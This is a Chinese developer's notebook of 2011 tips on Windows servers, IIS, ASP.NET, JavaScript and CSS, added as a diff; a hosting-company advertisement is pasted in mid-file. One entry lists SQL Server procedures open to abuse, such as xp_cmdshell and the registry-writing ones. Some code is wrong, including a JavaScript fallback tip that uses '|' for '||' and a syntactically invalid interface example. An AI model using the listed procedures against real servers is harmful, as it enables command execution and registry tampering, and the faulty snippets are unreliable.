@@ -1,0 +1,2231 @@
+2011-05-04
+开启或禁用远程桌面的方法：
+1. 注册表：设置 HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\fDenyTSConnections 的值；
+2. 组策略：配置 计算机配置 -> 管理模板 -> Windows 组建 -> 终端服务 -> 允许用户使用终端服务进行远程连接 的值；
+
+修改远程桌面端口号的方法：
+设置 HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp\PortNumber 的值；
+设置 HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\PortNumber 的值；
+在Windows防火墙中增加例外规则，尚不清楚如何修改Windows防火墙中默认远程桌面的规则；
+
+2011-05-06
+在客户端javascript代码中安全引用全局对象的方法：window.*
+
+2011-05-06
+javascript中显式转换：
+变量转换为字符串：v + ""，v为变量
+变量转换为数字：v - 0，v为变量
+变量转换为布尔值：!!v，v为变量
+
+2011-05-07
+javascript代码可以利用逻辑或运算符从一组备选数据中选取一个定义了的数据，例如：
+var i = max_width | preferences.width | 500;
+
+2011-05-11
+IIS日志中默认时间是格林尼治时间，它比北京时间晚了八小时。若要使用本地时间，需要在网站日志属性页中勾选“文件命名和创建使用当地时间”，重启IIS后无反映，似乎需要等第二天后才生效。
+
+2011-05-12【重要】
+Windows系统环境变量
+%ALLUSERSPROFILE%    		列出所有用户Profile 文件位置。
+%APPDATA%            		列出应用程序数据的默认存放位置。
+%CD%                 		列出当前目录。
+%CLIENTNAME%         		列出联接到终端服务会话时客户端的NETBIOS 名。
+%CMDCMDLINE%         		列出启动当前cmd.exe 所使用的命令行。
+%CMDEXTVERSION%      		命令出当前命令处理程序扩展版本号。
+%CommonProgramFiles% 		列出了常用文件的文件夹路径。
+%COMPUTERNAME%			列出了计算机名。
+%COMSPEC%			列出了可执行命令外壳 （命令处理程序）的路径。
+%DATE%				列出当前日期。
+%ERRORLEVEL%			列出了最近使用的命令的错误代码。
+%HOMEDRIVE%			列出与用户主目录所在的驱动器盘符。
+%HOMEPATH%			列出用户主目录的完整路径。
+%HOMESHARE%			列出用户共享主目录的网络路径。
+%LOGONSEVER%			列出有效的当前登录会话的域名控制器名。
+%NUMBER_OF_PROCESSORS%		列出了计算机安装的处理器数。
+%OS%				列出操作系统的名字。(WindowsXP 和Windows2000 列为Windows_NT.)
+%Path%				列出了可执行文件的搜索路径。
+%PATHEXT%			列出操作系统认为可被执行的文件扩展名。
+%PROCESSOR_ARCHITECTURE%	列出了处理器的芯片架构。
+%PROCESSOR_IDENTIFIER%		列出了处理器的描述。
+%PROCESSOR_LEVEL%		列出了计算机的处理器的型号。
+%PROCESSOR_REVISION%		列出了处理器的修订号。
+%ProgramFiles%			列出了ProgramFiles 文件夹的路径。
+%PROMPT%			列出了当前命令解释器的命令提示设置。
+%RANDOM%			列出界于0 和32767 之间的随机十进制数。
+%SESSIONNAME%			列出连接到终端服务会话时的连接和会话名。
+%SYSTEMDRIVE%			列出了Windows 启动目录所在驱动器。
+%SYSTEMROOT%			列出了Windows 启动目录的位置。
+%TEMP%或%TMP%			列出了当前登录的用户可用应用程序的默认临时目录。
+%TIME%				列出当前时间。
+%USERDOMAIN%			列出了包含用户帐号的域的名字。
+%USERNAME%			列出当前登录的用户的名字。
+%USERPROFILE%			列出当前用户Profile 文件位置。
+%WINDIR%			列出操作系统目录的位置
+
+2011-05-12【重要】
+SQL Server中一些易被利用的存储过程：
+xp_cmdshell @CommandLine --执行系统Shell命令
+xp_dirtree @Folder --列出指定文件夹中的文件夹和文件
+xp_subdirs @Folder --列出指定文件夹的子文件夹
+xp_enumgroups --列出Windows NT组及其描述的列表
+xp_fileexist @Path --检查文件是否存在
+xp_fixeddrives --列出驱动器列表
+
+xp_regenumvalues @RootKy, @SubKy --枚举指定注册表键下的值
+xp_regread @RootKy, @SubKey, @ValueName --读取指定注册表键的值
+xp_regwrite @RootKey, @SubKey, @ValueName, @ValueType, @Value --设置指定注册表值名称的值
+xp_regdeletekey @RootKey, @SubKey --删除指定的注册表键
+xp_regdeletevalue @RootKey, @SubKey, @ValueName --删除指定注册表值名称的值
+
+2011-05-12
+禁用默认共享的方法，修改或创建下面的注册表值
+服务器：HKLM\SYSTEM\CurrentControlSet\Services\lanmanserver\parameters\AutoShareServer DWORD 0
+客户机：HKLM\SYSTEM\CurrentControlSet\Services\lanmanserver\parameters\AutoShareWks DWORD 0
+
+2011-05-13【重要】
+Windows Server中重命名Administrator用户的方法：
+组策略 －> 计算机配置 －> Windows 设置 －> 安全设置 －> 本地策略 －> 安全选项 －> 账户：重命名系统管理员账户
+
+2011-05-13
+禁用Windows Script Hosting的方法：
+注销WScript.Shell, WScript.Network，代码：regsvr32 /u %windir%\system32\mshom.ocx
+注销Shell.Application，代码： regsvr32 /u %windir%\system32\shell32.dll
+注销FileSystemObject，代码：regsvr32 /u %windir%\system32\scrrun.dll
+
+2011-05-16【重要】
+HTML中的<script>标签必须被正确关闭，只能使用</script>标签来关闭它。HTML解释器将</script>做为最近一个尚未关闭的<script>标签的关闭标签，即使</script>标签出现在字符串中。
+例如：
+<script type="test/javascript" src="...." />         -- 错误
+<script type="test/javascript" src="...."></script>  -- 正确
+
+2011-05-17【重要】
+在JavaScript中模拟类
+1. 静态类使用对象直接量模拟，禁止用户使用new运算符创建对象
+var StaticClass = {
+	Property : Value,
+	Method : function () {
+	}
+};
+
+2. 普通类使用构造函数模拟
+var Class = function () {
+	this.InstanceProperty = Value;
+	this.InstanceMethod = function () {
+	};
+};
+
+Class.prototype.InstanceProperty = Value;
+Class.prototype.InstanceMethod = function () {
+};
+
+Class.StaticProperty = Value;
+Class.StaticMethod = function () {
+};
+
+3. 接口使用抛出错误的构造函数和方法模拟，不支持接口属性
+//定义所有接口的基类，继承它的类为接口
+var IInterface = {
+  IsImplementBy ： function(obj) {
+  };
+};
+
+//定义一个接口
+var Interface = {
+  IsImplementBy : IInterface.IsImplementBy;
+
+  Method = function () {
+    throw new Error("Not implementation.");
+  };
+};
+
+要实现接口的类，定义接口中定义的方法即可。
+通过此模式的接口实现，无法通过 intstanceof 运算符来判断对象类型，需要调用IsImplementBy方法来判断是否实现了某接口。
+
+4. 虚拟类通过使用抛出异常的方法模拟，不支持虚拟属性
+var AbstractClass = function () {
+	this.AbstractMethod = function () {
+          throw new Error("Not implementation.");
+	};
+};
+
+AbstractClass.prototype.AbstractMethod = function () {
+  throw new Error("Not implementation.");
+};
+
+2011-05-20
+Discuz! 7.2 数据库结构参考
+主题保存在cdb_threads表中；
+未审核的主题：displayorder = 2, moderated = 0;
+审核通过的主题：displayorder = 0, modereated = 1;
+放入回收站的主题：displayorder = -1, moderated = 1;
+从回收站中删除的主题：彻底从表中删除；
+
+
+帖子保存在cdb_posts表中，发表一份主题会在该表中拷贝一份，first = 0；
+
+2011-05-21【重要】
+CSS的Clip样式只对absolute定位元素生效，IE6不支持带逗号的写法，故兼容性写法为：
+clip: rect(top,right,bottom,left);
+clip: rect(top right bottom left);//兼容IE6
+
+2011-05-24【重要】
+CSS外边距合并规则：
+只有普通文档流中块框的垂直外边距才会发生外边距合并。行内框、浮动框或绝对定位之间的外边距不会合并。
+
+2011-05-25
+offsetWidth和offsetHeight包括内容、padding、border，但不包括maring。
+
+2011-06-06【重要】
+script和div标签必须使用</script>和</div>来正确关闭。
+
+2011-06-07【重要】
+在HTML中点击flash，打开链接的方法：使用button标签包装flash。具体如下：
+<button style="cursor:pointer;width:auto;height:auto;background-color:#FFFFFF;border-style:none;margin:0px;padding:0px;" onclick="window.open('?','_blank');">
+  <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab" width="?px" height="?px"><param name="movie" value="?" /><param name="flashvars" value="" /><param name="allowfullscreen" value="false" /><param name="quality" value="high" /><param name="wmode" value="opaque" /><embed src="?" flashvars="" allowfullscreen="false" quality="high" pluginspage="http://www.macromedia.com/go/getflashplayer" type="application/x-shockwave-flash" width="?px" height="?px" wmode="opaque" /></object>
+</button>
+其中，?是占位符，flash标签一定要设置wmode属性为opaque。
+
+2011-06-11【重要】
+IE6双倍边距BUG
+1、问题：在IE6下如果某个标签使用了float属性，同时设置了其外边距“margin:10px 0 0 10px”可以看出，上边距和左边距同样为10px，但第一个对象距左边有20px。
+2、解决办法：当将其display属性设置为inline时问题就都解决了。
+3、说明：这是因为块级对象默认的display属性值是block，当设置了浮动的同时，还设置了它的外边距 就会出现这种情况。也许你会问：“为什么第二个对象和第一个对象之间就不存在双倍边距的BUG”？因为浮动都有其相对应的对象，只有相对于其父对象的浮动 对象才会出现这样的问题。第一个对象是相对父对象的，而第二个对象是相对第一个对象的，所以第二个对象在设置后不会出现问题。另外在一些特殊布局中，可能需要组合使用display:block;和display:inline;才能达到预期效果。
+当然最坏的情况下，我们就可以使用"margin:10px 0 0 10px;*margin:10px 0 0 10px;_margin:10px 0 0 5px"，这种“标准属性;*IE7识别属性;_IE6识别属性”HACK方式解决。
+4、总结：这个现象仅当块级对象设置了浮动属性后才会出现，内联对象（行级对象）不会出现此问题。并且只有设置左边距和右边距的值才会出问题，上下边距不会出现问题。
+
+2011-06-11
+IE6中内联元素边框显示不完整的解决办法：
+使用IE6识别的CSS属性：_display: inline-block;
+
+例如：
+<a style="border: 1px solid #000000;">123</a> 在IE6中不显示上边框和下边框
+加上_display: inline-block;后显示完整。
+
+IE6中当内联元素超过容器宽度，而容器overflow为hidden，此时内联元素的margin无效的解决办法：
+使用IE6识别的CSS属性：_display: inline-block;
+
+例如：
+<div style="width: 10px; height: auto; overflow: hidden;"><a style="margin: 0px 0px 0px 10px;">1234567890123456789</a></div>
+在IE6中a元素的左外边距实效，加上_display: inline-block;后问题解决。
+
+IE6中display: inline-bolck无效的解决办法：
+使用IE6识别的CSS属性： _display: inline; _zoom: 1;
+
+
+2011-06-17【重要】
+使用JavaScript引发HTML事件的方法：
+1. IE中调用element.fireEvent("on...");
+2. 非IE中使用DOM标准模式：
+var e = window.document.createEvent("...");
+e.initEvents("...", ..., ...);
+element.dispatchEvent(e);
+
+2011-06-18【重要】
+现象：在使用JavaScript访问ashx写入数据库时，保存到数据库中的汉字总是乱码。
+原因：运行JavaScript的网页使用UTF-8编码，网站利用globalization元素设置默认编码为GB2312，故在解析参数时出现乱码。
+解决：在ashx处理中设置context.Request.ContentEncoding = Encoding.UTF-8。
+备注：尽量使用UTF-8编码，VS新建页面时的编码方式也是UTF－8。
+
+2011-06-21【重要】
+在CSS中使用width: 100%/height: 100%时，不要使用左右/上下外边距和内边距，因为在IE6中计算元素框的大小时没有算上内外边距，故元素框会被撑大。
+
+2011-06-25【重要】
+当页面中使用的JS文件编码和页面编码不一致时，可能会引起浏览器执行错误，例如：IE6。
+解决方法：在script标签中使用charset属性指定JS文件编码。
+
+2011-06-30【重要】
+javascript中单例模式的实现：
+var Singleton = (function() {
+  var m_instance = null;
+
+  var Implementation = function() {
+    //class implementation
+  };
+  
+  return {
+    GetInstance : function() {
+      if(!m_instance) {
+        m_instance = new Implementation();
+      }
+
+      return m_instance;
+    }
+  }
+})();
+
+2011-06-30【重要】
+页面居中的方法：margin: ?px auto;
+在IE下无效，则检查页面是否有文档类型声明：
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+若无文档类型声明，则此CSS属性不会生效。
+
+2011-07-05
+Open sendto folder of windows 7: run shell:sendto
+
+2011-07-06【重要】
+微软官方提供的IE个版本兼容性测试工具：Microsoft Expression Studio: Web SuperPreview.
+
+2011-07-15【重要】
+clear: both元素在IE6中存在一个高度。
+原因：IE6会使用默认字体大小和行高撑大这个div。
+解决：font-size: 0px; height: 0px;
+浮动清理元素的样式定义：
+.clear {
+  width: 100%;
+  margin: 0px;
+  padding: 0px;
+  border-width: 0px;
+  font-size: 0px;
+  line-height: 0px;
+  clear: both;  
+}
+
+2011-07-20【重要】
+使用下面的代码输出图片时，会出现错误：远程主机已断开连接...
+    byte[] data = File.ReadAllBytes(path);
+    HttpResponse response = context.Response;
+    response.BufferOutput = true;
+    response.ContentType = this.ImageMIME;
+    response.Clear();
+    response.BinaryWrite(File.ReadAllBytes(path));
+    response.Flush();
+    context.ApplicationInstance.CompleteRequest();
+
+修改为下面的代码后，问题解决。
+    byte[] data = File.ReadAllBytes(path);
+    HttpResponse response = context.Response;
+    response.BufferOutput = true;
+    response.AddHeader("Connection", "keep-alive");
+    response.AddHeader("Content-Length", data.Length.ToString());
+    response.ContentType = this.ImageMIME;
+    response.Clear();
+    response.BinaryWrite(File.ReadAllBytes(path));
+    context.ApplicationInstance.CompleteRequest();
+
+2011-07-20
+服务器出现错误，事件来源：.NET Runtime 2.0，事件ID：1000，Faulting application w3wp.exe...
+解决办法：打开组件管理器（），选择IIS Admin Service，属性，安全，启动和激活权限中给予Network Service权限。
+
+2011-07-21【重要】
+调用Graphics.FromImage方法时，需要注意Image对象的PixelFormat，若是索引像素格式或者未定义格式，则会出现异常。
+解决办法，使用支持的像素格式，创建一幅与原图相同的图像来操作。
+
+2011-07-21【重要】
+在网页中挂QQ留言的方法：访问腾讯官方网站http://wp.qq.com/或http://shang.qq.com/，生成网页代码，如下：
+<a target="_blank" href="http://wpa.qq.com/msgrd?v=3&uin=1197542826&site=qq&menu=yes"><img border="0" src="http://wpa.qq.com/pa?p=2:1197542826:51" alt="客户服务" title="客户服务" /></a>
+
+2011-07-23
+网页转化为PDF文件的方法：访问：http://pdfmyurl.com/，输入网址（不需要http://前缀），点击按钮即可下载生成的PDF文件。
+
+2011-07-30
+使用ASP.NET提供服务（Web Service或.ashx）时，若要设置字符编码，则需要对Request和Response的ContentEncoding都进行设置才能够兼容所有浏览器。
+
+2011-08-04【重要】
+DIV覆盖FLASH，模拟FLASH链接的方法：
+  <div id="m_divFlash" style="width: 300px; height: 300px; margin: 20px auto; padding: 0px; position: relative; left: 0px; top: 0px;">
+    <div style="width: 300px; height: 300px; position: absolute; left: 0px; top: 0px;">
+      <embed src="Flashs/Map.swf" quality="high" pluginspage="http://www.macromedia.com/go/getflashplayer" type="application/x-shockwave-flash" width="300" height="300" wmode="opaque"></embed>
+    </div>
+    <div style="width: 300px; height: 300px; position: absolute; left: 0px; top: 0px; z-index: 99; cursor: pointer; background-image: url('about:blank');" onclick="window.open('http://www.baidu.com','_blank');">
+    </div>
+  </div>
+注释：
+0. z-index样式只对定位元素有效；
+1. 设置FLASH的wmode属性为opauqe或transparent，以便可以控制FLASH的层深度；
+2. 为要覆盖FLASH的DIV设置一个空背景，否则在IE中将无效；
+
+2011-08-04【重要】
+XmlDocument.CreateTextNode方法会自动对字符串进行XML编码；
+XmlNode.InnerXml属性不会字符串进行XML编码，因此可以使用它填充编码后的HTML字符串，因为XML默认不对空格进行编码；
+XmlAttribute.Value属性的setter方法会自动对字符串进行XML编码；
+
+2011-08-07
+通过wrap属性来控制textarea的换行模式，关闭自动换行，使用：wrap="false"
+
+2011-08-10【重要】
+javascript使用的字符编码格式与调用它的页面编码相同。
+
+2011-08-24
+若IE显示页面未按照CSS布局，则需要检查一下是否设置了正确的文档声明。
+
+2011-08-24【重要】
+百度快照不全的原因：
+百度有个设置是蜘蛛抓取网页的上限为125K，当网页大小超过125K，则超出的部分会被百度抛弃，在被抛弃的地方出现的链接都不会被百度抓取，同样在被抛弃的地方优化布局的关键词，也将全部无效。所以根据这个情况我们要尽量保持网页尽量不要超过125K，如果必须大于125K，则要将重要的内部链接布局和关键词布局的重点放在网页的上半部分，这样也会让网站获得不错的排名。否则百度抓取不到的部分对于网站的排名也起不到任何作用的。
+
+解决办法：
+
+2011-08-25
+表单和表单元素的name属性：
+1. 设置了name属性的表单会成为document的一个属性，若多个表单具有相同的name属性，则document会具有一个名称和name属性值相同的数组属性，数组中的元素即为按照出现顺序排列的表单；
+2. 设置了name属性的表单元素会成为表单的一个属性，若多个表单元素具有相同的name属性，则表单会具有一个名称和name属性值相同的数组属性，数组中的元素即为按照出现顺序排列的表单元素；
+
+2011-08-31
+XML中的元素 VS 属性
+
+因使用属性而引起的一些问题：
+1. 属性无法包含多重的值（元素可以）
+2. 属性无法描述树结构（元素可以）
+3. 属性不易扩展（为未来的变化）
+4. 属性难以阅读和维护
+所以，应避免使用属性，请尽量使用元素来描述数据。而仅仅使用属性来提供与数据无关的信息。
+元数据（有关数据的数据）应当存储为属性，而数据本身应当存储为元素。
+
+2011-09-19【重要】
+将ASP.NET页的AutoEventWireup设置为true，这ASP.NET将在运行时查找具有特定签名的事件处理方法，这将导致一定的性能损失。
+所有，不建议设置AutoEventWireup为true。
+
+2011-09-20
+ASP.NET生命周期
+IIS经典模式
+0. 收到请求
+1. IIS检查文件扩展名，决定是否路由到ASP.NET处理
+2. ASP.NET创建ApplicationManager的实例，创建新的应用程序域
+3. ASP.NET创建HostingEnvironment的实例，创建HTTP上下文对象：HttpContext, HttpRequest, HttpResponse
+4. ASP.NET重用或创建新的HttpApplication实例，初始化所有配置的HttpModule（调用IHttpModule.Init方法），初始化此HttpApplication对象（调用IHttpModule.Init方法）
+5. 由HttpApplication管线处理请求，引发处理阶段性事件，执行Global.asax中事件处理程序，执行配置的HttpModule中的事件处理程序
+
+IIS集成模式
+0. 收到请求
+1. 所有请求都由ASP.NET模块处理
+2. ASP.NET创建ApplicationManager的实例，创建新的应用程序域
+3. ASP.NET创建HostingEnvironment的实例，创建HTTP上下文对象：HttpContext, HttpRequest, HttpResponse
+4. ASP.NET重用或创建新的HttpApplication实例，初始化所有配置的HttpModule（调用IHttpModule.Init方法），初始化此HttpApplication对象（调用IHttpModule.Init方法）
+5. 由HttpApplication管线处理请求，引发处理阶段性事件，执行Global.asax中事件处理程序，执行配置的HttpModule中的事件处理程序
+注意：不会调用Global.asax文件中的处理程序代码来处理对非 ASP.NET 资源（如静态文件）的请求。 若要运行为所有资源运行的托管代码，请创建一个实现 IHttpModule 接口的自定义模块。 该自定义模块将会运行，以处理对应用程序中的资源的所有请求，即使资源处理程序不是 ASP.NET 处理程序。
+
+自定义 IHttpModule 中定义的事件处理程序将会 先于 Global.asax 中定义的事件处理程序执行；
+
+2011-09-20
+ASP.NET页和空间生命周期事件顺序：
+0. 各个控件的 Init 事件在页的 Init 事件之前发生。
+1. 各个控件的 Load 事件在页的 Load 事件之后发生。
+2. 各个控件的 PreRender 事件在页的 PreRender 事件之后发生。
+虽然 Init 和 Load 都在每个控件上以递归方式发生，但它们的发生顺序相反。 每个子控件的 Init 事件（还有 Unload 事件）在为其容器引发相应的事件之前发生（由下到上）。 但是，容器的 Load 事件是在其子控件的 Load 事件之前发生（由上到下）。 母版页的行为方式类似于页上的子控件：母版页 Init 事件发生在页的 Init 和 Load 事件之前，母版页 Load 事件发生在页的 Init 和 Load 事件之后。
+
+2011-09-25【重要】
+注意：当请求ASP.NET中的内容页时，母板页和内容页中的代码都在内容页的上下文中运行。
+ASP.NET会自动修改母板页中服务器控件引用的URL，使其能够在内容页上下文中正确解析，但不会修改非服务器控件引用的URL。
+故，建议在母板页中优先使用服务器控件，这样可以避免移动母板页或内容页时的URL维护问题。
+
+2011-09-28
+为什么会有南北互访困难的问题？    由于我国目前的网络ISP运营商有中国电信和中国网通, 两者都有大量的用户。有一定网龄的人基本都知道“南电信”、“北网通”的说法, 这几年随着网通的逐渐壮大, 网通用户规模还在越来越大，北方很多省市(北京、河北、山东、辽宁、吉林等)的用户主要是通过网通接入上网；而南方大部分用户是通过电信接入上网，(现在南方网通用户也慢慢多起来)， 而两大网络运营商之间的连接带宽比较有限，虽然两者每年都在增加互连带宽，但还是远远跟不上互联网发展的速度，因此也就形成了南北两地用户由于电信和网通的互联互通瓶颈,电信用户访问网通服务器 、网通用户访问电信服务器都很慢, 一般电信用户访问采用电信线路的网站的速度是非常快的（ping数据在几十MS之间, 并且掉包很少）；而跨网之间的访问 非常慢（ping数据在200MS以上，并且有大量掉包 ），这样导致网站运营者的站点无论放在电信机房还是网通机房，都会丢失另一半潜在的客户－－如果网站放在电信机房，那么势必丢失网通的用户；而如果网站放在网通机房 ，就会丢失电信用户。
+    那么， 电信网通互联情况的糟糕程度从哪几个方面可以看出来？我们不妨采用一组实测的数据来说明：
+    1. 文件传输速度慢：电信用户上传/下载文件到网通服务器，只有可怜的几K，甚至0.1 K，这个相信很多上网的用户都有体会；而同是电信之间的文件上传/下载速度可以高达40k以上； 
+    2. ping 延时：一般电信服务器之间ping 的延时是在 40ms 以内(同省网的会更快，例如佛山 ping 广州服务器在 10多ms)；而电信到网通 ping 延时在 200ms左右 ，并且掉包率在 20% 以上，这实际就是电信网通互相访问慢的根源；
+    3. 电信网通线路不稳定：一般上网高峰时间(下午和晚上)互联互通瓶颈非常严重，而在凌晨和上午这个时间段，上网人数比较少，不会表现那么严重
+    ?双线、多线，中小网站解决南北互访的最佳方案
+    既然南北互访对网站建设者和访问者都存在如此多的不便，那么肯定需要采用一定的方式来解决，目前常见的是以下3种：
+    1－电信网通 镜像
+    一个网站分别两个服务器，分别放在电信机房和网通机房，然后让电信用户访问电信站点，网通用户访问网通站点，这样让用户获得最好的网络速度。
+    2－CDN网站加速服务
+    网通分别放一个缓存服务器，用户实际访问缓存服务器，缓存服务器再原网站服务器读取内容，并将已经读取的内容缓存到本地。
+    3－双线主机服务
+    双线服务器实际是一台服务器分别有电信和网通两条线路接入，通过对用户 IP 地址的智能解析，实现电信用户访问电信线路，网通用户访问网通线路，这样实现全国都快速访问的目的。根据不同的机房接入方式，双线服务接入有分单IP接入、单网卡双IP接入和双网卡双IP共3种接入方式，其中最好的是单网卡双IP接入，分别提供一个电信IP和网通IP。
+    有不少资料拿这几种方式进行比较，分析各自的优劣，这本来也对读者很有帮助，不过看过这些报道还是让人不免有些偏激，会认为某一种方式比其他的方式好，或者觉得哪一种最好，哪一种最不好，其实事实也并不是那么绝对，因为除了效果，还要考虑投资以及维护等问题，最合理的说法应该是根据网站的不同性质，比较合适的互访解决方式也不同：例如，大型的门户网站比较适合采用 CDN加速服务，这种技术对静态内容加速效果明显，而门户网站基本都是以静态页面为主，但是该技术并不适合中小网站使用，因为需要的资金太大，而且对动态页面不适用；电信网通甚至教育网做多镜像站点的方法也是大站常用的加速方式，这种方式同时也能达到分流减压的效果，但是数据的同步和维护比较麻烦，而且资金投入也不小，不适合中小网站，反而是双线、多线在资金和达到的效果方面更能满足中小网站的需求，不过这种技术也有缺陷，就是稳定性不好，因为根据归结到底还是要根据 IP 进行线路选择，在 DNS 解析、路由解析方面过于复杂，另外，这种双线加速虽然可以实现南北访问的基本同速，但是并不具备分流的效果，服务器的压力还是较大，因此多用于访问量压力不是很大的普通站点，尤其是近年来在领域得到很好的推广应用，也获得了广大用户的认可。
+    怎么才是优秀的双线？
+    双线、多线技术效果怎么样，最关键的问题有两个，一个是采用的网卡、IP工作模式，二是对用户 IP 地址的智能解析是否稳定可靠。
+    先谈第一个问题：
+    1. 双网卡双IP的双线：早期一些机房由于自身技术/设备不过关，无法在机房路由器上实现切换，只能采用一台服务器两个网卡，两条网线分别接入电信/网通，这样做会导致服务器路由随机波动，并导致用户访问时快时慢，甚至完全不能访问，这种实际已经是被淘汰的落后方法。
+    2. 单IP的双线：单线单IP实现双线路，这种是新兴的路由技术，这个IP不属于任何电信运营商，当解析的时候，自动判断访问者是那种线路，使该IP走那种线路，满足各线路需要。不过，单IP双线服务是在机房路由器级根据用户线路，切换相应的电信/网通线路，由于大部分双线路机房是从电信、网通获得IP地址，没有权限切换线路，导致根本无法达到全网快速的目的，而一部分有IP自治域的机房，却无法获得从电信/网通获得足够的带宽，导致用户访问速度并不理想。
+    3. 单网卡双IP的智能双线：单网卡双IP智能双线是一种在单一网卡上绑定2个IP地址的新技术，这两个IP地址可以分别属于电信和网通，并且是电信和网通分配的IP地址，因此它们可以享用这两大网络运营商的带宽，当用户访问服务器上的网页时，网卡会根据用户来自于哪一条线路而分配相应的IP地址进行链接，这样就大大的提高了用户访问商家网站的速度。从而避免了单IP双线的弱点，真正实现全网快速访问,并且保证电信和网通都有充足的可扩展带宽。
+    网上也有一些运营商采用第三方 ISP 线路达到双线的效果，就是采用非电信非网通的线路，例如：移动、联通。这种线路连接到无论是电信和网通的速度都是很不错的，效果与真的双线差不多，不过毕竟有带宽限制，小型网站速度很不错，大型的网站就不行了。
+    所以，大家在选择的时候，可以尽量选单网卡双IP的双线或是第三方 ISP 线路，效果都不错。
+    再说说第二个问题：IP 地址的解析
+    不管是哪一种双线，都需要对用户和服务器的 IP 地址进行解析才能选择线路，所以 IP 地址解析技术、设备和一个完善庞大的地址库是非常重要的－－其原理是用户访问网站时先向DNS服务器查询这个网站的IP地址，而DNS服务器会判断用户是电信上网还是网通上网？是电信上网 就返回电信IP地址；是网通上网就返回网通IP地址；这样实现智能判断，智能识别的目的。
+    由于这种解析技术有一定的门槛，所以不是每个运营商都能够实现，而只有采用了智能 DNS 解析的双线主机才可以说的上是真正的双线服务。通过智能解析平台,实现电信用户智能选择电信线路,网通用户智能选择网通线路,具体效果参看河南亿恩科技提供测试图片:
+    上海电信ping 亿恩科技 主站www.enkj.com
+
+    河南网通ping亿恩科技 主站www.enkj.com
+
+
+    河南亿恩科技有限公司从成立到现在,已经走过了风雨八年，目前在全国运营电信、网通,单IP双线、双IP双线等共计12个机房，其中公司垄断运营的九江双线更是目前国内最大的双线单网卡双线机房 ,电信10G 带宽，网通2G带宽，并且在和国内知名安全服务商傲盾合作的基础上(http://www.aodun.com.cn/temp/104.htm),又引入2G 的绿盟黑洞硬件防火墙做牵引,能给广大客户一个更加安全、稳定的网络环境。凭此优质的网络和服务，公司吸引了广大站长的加盟和支持，包括本站太平洋、华军、霏凡、木蚂蚁等纷纷入住本机房，在次也向提供发表场地的太平洋表达我们最真挚的谢意
+
+QQ:651977881         0371-63322208
+
+2011-10-19
+抽象工厂模式，解耦客户端和具体产品的依赖；
+不变：产品类型；
+变化：产品实现；
+
+抽象工厂 ---> 具体工厂
+抽象产品 ---> 具体产品
+
+建造者模式，解耦客户端和产品的具体组成部分的依赖；
+不变：组成部分，构造算法；
+变化：组成部分实现；
+
+指导者 ---> 构造算法
+抽象建造器 ---> 具体建造器
+
+原型模式，解耦客户端和具体产品及其数量的依赖，可以动态增加或删除新的具体产品；
+不变：产品类型；
+变化：产品实现，产品数量；
+
+2011-10-22【重要】
+使WebService支持HTTP-GET和HTTP-POST调用的方法：
+在Web.config做以下配置：
+    <webServices>
+      <protocols>
+        <add name="HttpGet"/>
+        <add name="HttpPost"/>
+      </protocols>
+    </webServices>
+
+2011-10-24【重要】
+IE6（IE7,IE8未测试）不支持document.createElementNS方法,使用element.setAttribute("xmlns",namespace-url)替换；
+
+2011-10-26
+HTML元素未放入到DOM树之前，offsetWidth和offsetHeight属性将返回零。
+
+2011-10-26【重要】
+IE6/7/8不支持style.cssFloat属性，使用style.styleFloat属性代替；
+
+2011-10-29【重要】
+IE6不支持select标签的add(option,before)方法，若调用add(option,null)，则IE6会提示错误；类型不匹配，IE6中需要忽略该参数；
+通用的方法：select.options[select.options.length] = option;
+
+2011-10-30【重要】
+对于script标签的事件，IE6/7/8支持onreadystatechange，IE9开始支持onreadystatechange,onload和onerror事件，Firefox/Chrome支持onload和onerror事件，opera支持onload事件；
+使用<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7" />标签，IE9将模拟IE7，script标签将不支持onload和onerror事件。
+查询window.document.documentMode可以获知IE浏览器的兼容模式，例如，使用上面的标签，该属性将返回7。
+
+2011-11-05【重要】
+ASP.NET中的超时设置
+1. IIS设置：站点属性 -> 主目录 ->配置 -> 选项 -> ASP脚本超时；
+2. ASP.NET设置：httpRuntime配置节的executionTimeout属性；（通过HttpServerUtility.ScriptTimeout编程设置）
+
+2011-11-05【重要】
+关于IIS应用程序池运行账户和IIS网站匿名访问账户的区别：
+1. 应用程序池账户：运行IIS处理进程的账户，需要对网站所在的目录和文件具有相应的读/写/运行权限；
+2. 匿名访问账户：该账户的权限限定了访问网站的用户所具有的权限；
+
+2011-11-07【重要】
+使用ASP.NET Repeater控件显示层次数据的方法：
+标签中设置内层Repeater的DataSource属性等于：((T)Container.DataItem).ChildData
+参考：http://support.microsoft.com/default.aspx?scid=kb;EN-US;306154
+
+2011-11-08【重要】
+IIS匿名访问账户权限决定了用户是否有权限访问特定的资源；
+IIS应用程序池账户权限决定了网站代码具有的权限，w3wp.exe运行在此账户下；
+
+IIS7(WIN7/WIN2008）中应用程序池账户默认为ApplicationPoolIdentity，这是一个动态创建的账户，在用户管理和net user命令中看不到；
+对网站目录进行权限设置时，通过添加IIS AppPool\AppPoolName来管理应用程序池账户的权限，与普通的权限管理相同；
+在SQL SERVER设置登录帐号时，直接在登录名中录入“IIS AppPool\AppPoolName”，若使用搜索功能，则会出现错误。
+
+2011-11-12【重要】
+兼容的清理元素样式：
+.clear {
+  clear: both;
+  font-size: 0px;
+  line-height: 0px;
+}
+
+2011-11-12【重要】
+IE6中使用script标签进行跨域调用（例如：调用Xphter.WebService.CrossCall方法）的函数，必须在页面的最后或load事件中执行，否则IE6会一直提示载入中，后面的标签无法显示；
+
+2011-11-19【重要】
+数据库中对象名称（例如：字段名称，表名称）的限定形写法：
+1. SQL SERVER: [name]
+2. MY SQL: `name`
+3. ORACLE: "NAME", 对象名称必须大写
+
+2011-11-28【重要】
+IE6/7/8中创建一个Image，然后响应它的onload事件时，需要先注册onload事件处理程序，然后再设置src属性，否则当IE6/7/8从缓存中获取图片数据时，将来不及引发onload事件。
+其他浏览器不存在这样的问题，就算是从缓存中获取的图片数据，浏览器也会响应后面注册的onload事件。
